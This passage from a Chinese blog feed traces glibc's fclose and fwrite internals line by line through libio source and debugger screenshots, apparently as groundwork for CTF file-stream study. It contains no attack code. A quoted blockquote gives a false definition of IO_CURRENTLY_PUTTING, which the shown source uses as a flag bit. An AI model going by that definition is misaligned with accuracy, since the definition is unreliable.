class="meta">#<span class="keyword">define</span> _IO_SYSCLOSE(FP) JUMP0 (__close, FP)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;虚表中的__close，即_IO_file_close函数&#x3D;&#x3D;<mark></mark></mark></p><p><strong>&#x2F;libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_close (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Cancelling close should be avoided if possible since it leaves an</span></span><br><span class="line"><span class="comment">     unrecoverable state behind.  */</span></span><br><span class="line">  <span class="keyword">return</span> close_not_cancel (fp-&gt;_fileno);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> close_not_cancel(fd) \</span></span><br><span class="line"><span class="meta">  __close (fd)</span></span><br></pre></td></tr></table></figure><img src="/2023/04/01/IO-FILE-fclose/image-20230401232801039.png" alt="image-20230401232801039" style="zoom:80%;"><p>直接系统调用close关闭文件</p><h4 id="销毁文件流结构体内容-释放缓冲区"><a href="#销毁文件流结构体内容-释放缓冲区" class="headerlink" title="销毁文件流结构体内容,释放缓冲区"></a>销毁文件流结构体内容,释放缓冲区</h4><p>回到**_IO_new_file_close_it**_mode&#x3D;-1不符合条件</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_setb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">_IO_setg (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">_IO_setp (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放缓冲区，_IO_buf_base，_IO_buf_end置空，设置_IO_USER_BUF位域</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setp(__fp, __p, __ep) \</span></span><br><span class="line"><span class="meta">       ((__fp)-&gt;_IO_write_base = (__fp)-&gt;_IO_write_ptr \</span></span><br><span class="line"><span class="meta">    = __p, (__fp)-&gt;_IO_write_end = (__ep))</span></span><br></pre></td></tr></table></figure><p>macro展开后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_ptr = (<span class="literal">NULL</span>), (fp)-&gt;_IO_read_end = (<span class="literal">NULL</span>));</span><br><span class="line">((fp)-&gt;_IO_write_base = (fp)-&gt;_IO_write_ptr = <span class="literal">NULL</span>, (fp)-&gt;_IO_write_end = (<span class="literal">NULL</span>));</span><br></pre></td></tr></table></figure><p>把read write相关缓冲区指针置空</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fp-&gt;_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;</span><br><span class="line">fp-&gt;_fileno = <span class="number">-1</span>;</span><br><span class="line">fp-&gt;_offset = _IO_pos_BAD;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fclose/image-20230401235020311.png" alt="image-20230401235020311"></p><h3 id="确认文件关闭，释放文件流结构体内存"><a href="#确认文件关闭，释放文件流结构体内存" class="headerlink" title="确认文件关闭，释放文件流结构体内存"></a>确认文件关闭，释放文件流结构体内存</h3><h3 id="IO-new-file-finish"><a href="#IO-new-file-finish" class="headerlink" title="IO_new_file_finish"></a>IO_new_file_finish</h3><p>回到 <strong>_IO_new_fclose</strong> _IO_FINISH (fp);</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_FINISH(FP) JUMP1 (__finish, FP, 0)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;虚表中的_finish，对应_IO_new_file_finish函数&#x3D;&#x3D;<mark></mark></mark></p><p><strong>libio&#x2F;fileops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_new_file_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_is_open (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_do_flush (fp);</span><br><span class="line">      <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_DELETE_DONT_CLOSE))</span><br><span class="line">    _IO_SYSCLOSE (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_finish, _IO_file_finish)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><p>直接来到_IO_default_finish(fp)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_default_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *<span class="title">mark</span>;</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">      fp-&gt;_IO_buf_base = fp-&gt;_IO_buf_end = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (mark = fp-&gt;_markers; mark != <span class="literal">NULL</span>; mark = mark-&gt;_next)</span><br><span class="line">    mark-&gt;_sbuf = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_save_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_IO_save_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_fini (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_finish)</span><br></pre></td></tr></table></figure><p>都不符合要求来到_IO_un_link<code>if (fp-&gt;file._flags &amp; _IO_LINKED)</code>不符合，返回_IO_new_fclose</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">  &#123;</span><br><span class="line">    fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">free</span>(fp);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>置零后释放文件流结构体内存</p><h2 id="close函数调用的vtable函数"><a href="#close函数调用的vtable函数" class="headerlink" title="close函数调用的vtable函数"></a><code>close</code>函数调用的vtable函数</h2><ul><li>在清空缓冲区的<code>_IO_do_write</code>函数中会调用vtable中<code>__write</code>对应的<code>_IO_new_file_write</code>的函数。</li><li>关闭文件描述符<code>_IO_SYSCLOSE</code>函数为<code>_close</code>，即<code>_IO_file_close</code>函函数。</li><li><code>_IO_FINISH</code>函数为vtable _finish，对应<code>_IO_new_file_finish</code>函数</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fwrite</title>
      <link href="/2023/04/01/IO-FILE-fwrite/"/>
      <url>/2023/04/01/IO-FILE-fwrite/</url>
      
        <content type="html"><![CDATA[<h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE* stream)</span>;</span><br></pre></td></tr></table></figure><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>]=<span class="string">&quot;flag&#123;grxer&#125;&quot;</span>;</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./flag1&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fwrite(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="x2F-libio-x2F-iofwrite-c-IO-fwrite"><a href="#x2F-libio-x2F-iofwrite-c-IO-fwrite" class="headerlink" title="&#x2F;libio&#x2F;iofwrite.c _IO_fwrite"></a><strong>&#x2F;libio&#x2F;iofwrite.c _IO_fwrite</strong></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t request = size * count;</span><br><span class="line">  _IO_size_t written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>CHECK_FILE</strong>检测一下flag的魔数，加锁判断</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> _IO_fwide(__fp, __mode) \</span></span><br><span class="line"><span class="meta">  (&#123; int __result = (__mode);                              \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> (__result &lt; 0 &amp;&amp; ! _IO_fwide_maybe_incompatible)              \</span></span><br><span class="line"><span class="meta">       &#123;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">if</span> ((__fp)-&gt;_mode == 0)      \</span></span><br><span class="line"><span class="meta">       <span class="comment">/* We know that all we have to do is to set the flag.  */</span>      \</span></span><br><span class="line"><span class="meta">       (__fp)-&gt;_mode = -1;      \</span></span><br><span class="line"><span class="meta">     __result = (__fp)-&gt;_mode;      \</span></span><br><span class="line"><span class="meta">       &#125;                                      \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span> <span class="keyword">if</span> (__builtin_constant_p (__mode) &amp;&amp; (__mode) == 0)              \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide_maybe_incompatible ? -1 : (__fp)-&gt;_mode;          \</span></span><br><span class="line"><span class="meta">     <span class="keyword">else</span>                                      \</span></span><br><span class="line"><span class="meta">       __result = _IO_fwide (__fp, __result);                      \</span></span><br><span class="line"><span class="meta">     __result; &#125;)</span></span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401120543002.png" alt="image-20230401120543002"></p><h3 id="进入-IO-sputn，"><a href="#进入-IO-sputn，" class="headerlink" title="进入_IO_sputn，"></a>进入_IO_sputn，</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用vtable里**__xsputn<strong>指向的</strong>libio&#x2F;fileops.c里的_IO_new_file_xsputn**函数，传入的参数为文件流结构体_IO_FILE,数据目标地址，读取总字节数&#x3D;&#x3D;<mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">      <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          count = p - s + <span class="number">1</span>;</span><br><span class="line">          must_flush = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">    count = to_do;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">      <span class="built_in">memcpy</span> (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      f-&gt;_IO_write_ptr += count;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_size_t block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">    &#123;</span><br><span class="line">      count = new_do_write (f, s, do_write);</span><br><span class="line">      to_do -= count;</span><br><span class="line">      <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">        <span class="keyword">return</span> n - to_do;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">     buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">     so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">    to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_xsputn, _IO_file_xsputn)</span><br></pre></td></tr></table></figure><p>刚fopen完此时大部分字段位NULL</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401153712485.png" alt="image-20230401153712485" style="zoom:80%;"><p>前面几个if都不成立，来到<code> if (to_do + must_flush &gt; 0)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p><mark>&#x3D;&#x3D;调用虚表中的__overflow，即_IO_new_file_overflow函数，第一参数_IO_FILE文件流结构体，第二个参数 EOF(-1)&#x3D;&#x3D;<mark></mark></mark></p><h2 id="申请并初始化缓冲区，文件流结构体完善"><a href="#申请并初始化缓冲区，文件流结构体完善" class="headerlink" title="申请并初始化缓冲区，文件流结构体完善"></a>申请并初始化缓冲区，文件流结构体完善</h2><h4 id="x2F-libio-x2F-fileops-c-IO-new-file-overflow"><a href="#x2F-libio-x2F-fileops-c-IO-new-file-overflow" class="headerlink" title="&#x2F;libio&#x2F;fileops.c _IO_new_file_overflow"></a><strong>&#x2F;libio&#x2F;fileops.c</strong> _IO_new_file_overflow</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_doallocbuf (f);</span><br><span class="line">      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">/* Otherwise must be currently reading.</span></span><br><span class="line"><span class="comment">     If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,</span></span><br><span class="line"><span class="comment">     logically slide the buffer forwards one block (by setting the</span></span><br><span class="line"><span class="comment">     read pointers to all point at the beginning of the block).  This</span></span><br><span class="line"><span class="comment">     makes room for subsequent output.</span></span><br><span class="line"><span class="comment">     Otherwise, set the read pointers to _IO_read_end (leaving that</span></span><br><span class="line"><span class="comment">     alone, so it can continue to correspond to the external position). */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (_IO_in_backup (f)))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;</span><br><span class="line">      _IO_free_backup_area (f);</span><br><span class="line">      f-&gt;_IO_read_base -= MIN (nbackup,</span><br><span class="line">                   f-&gt;_IO_read_base - f-&gt;_IO_buf_base);</span><br><span class="line">      f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)</span><br><span class="line">    f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;</span><br><span class="line">      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;</span><br><span class="line">      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;</span><br><span class="line">      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;</span><br><span class="line">      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;</span><br><span class="line"></span><br><span class="line">      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">    f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">              f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><p>先判断文件流结构体flag是不是有不可写属性返回EOF</p><p>检测受否有_IO_CURRENTLY_PUTTING或_IO_write_base是否为空</p><blockquote><p>IO_CURRENTLY_PUTTING是GNU C库中使用的宏，用于表示FILE流当前写入数据的输出缓冲区位置。它的定义如下：</p><p>#define IO_CURRENTLY_PUTTING(fp) ((fp)-&gt;_IO_write_ptr - (fp)-&gt;_IO_write_base)</p></blockquote><p>IO_write_base为空符合条件调用_IO_doallocbuf分配缓冲区，fwrite分析过</p><p><mark>&#x3D;&#x3D;调用虚表中的__doallocate指向的_IO_file_doallocate函数&#x3D;&#x3D;<mark></mark></mark></p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401162158010.png" alt="image-20230401162158010" style="zoom: 80%;"><p>接下来的_IO_setg也在fread里分析过_</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_setg(fp, eb, g, eg)  ((fp)-&gt;_IO_read_base = (eb),\</span></span><br><span class="line"><span class="meta">    (fp)-&gt;_IO_read_ptr = (g), (fp)-&gt;_IO_read_end = (eg))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((fp)-&gt;_IO_read_base = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_ptr = (fp-&gt;_IO_buf_base), (fp)-&gt;_IO_read_end = (fp-&gt;_IO_buf_base));</span><br></pre></td></tr></table></figure><p>_也就是把结构体里的<strong>read</strong>相关的3个指针均初始化为IO_buf_base</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401164402279.png" alt="image-20230401164402279" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_in_backup(fp) ((fp)-&gt;_flags &amp; _IO_IN_BACKUP)</span></span><br></pre></td></tr></table></figure><p>_IO_in_backup这里不成立，来到给fp的write相关指针赋值，并设置_IO_CURRENTLY_PUTTING 属性，用于表示当前正在执行输出操作</p><img src="/2023/04/01/IO-FILE-fwrite/image-20230401171509678.png" alt="image-20230401171509678" style="zoom:80%;"><h2 id="根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件"><a href="#根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件" class="headerlink" title="根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件"></a>根据处理数据大小和缓冲区大小决定往缓冲区里写数据或直接写入文件</h2><p>ch&#x3D;EOF(-1),执行_IO_do_write(f, f-&gt;_IO_write_base,f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</p><h5 id="x2F-libio-x2F-fileops-c中-IO-new-do-write"><a href="#x2F-libio-x2F-fileops-c中-IO-new-do-write" class="headerlink" title="&#x2F;libio&#x2F;fileops.c中**_IO_new_do_write**"></a><strong>&#x2F;libio&#x2F;fileops.c</strong>中**_IO_new_do_write**</h5><p>函数第一个参数_IO_FILE文件流结构体，第二个参数输出缓冲区，第三个参数为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_new_do_write _IO_do_write</span></span><br><span class="line">_IO_new_do_write (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (_IO_size_t) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>todo&#x3D;&#x3D;0成立，直接返回0，回到**_IO_new_file_xsputn**函数</p><p><code>if (_IO_OVERFLOW (f, EOF) == EOF)</code>不成立</p><p>设置blocksize为申请的缓冲区大小</p><p><strong>do_write</strong>根据<code>do_write = to_do - (block_size &gt;= 128 ? to_do % block_size : 0);</code>赋值</p><h4 id="fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k"><a href="#fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k" class="headerlink" title="fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k"></a>fwrite写入大小参数小于申请的缓冲区大小，一般最多为4k，本测试为1k</h4><p>do_write为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (to_do)</span><br><span class="line">    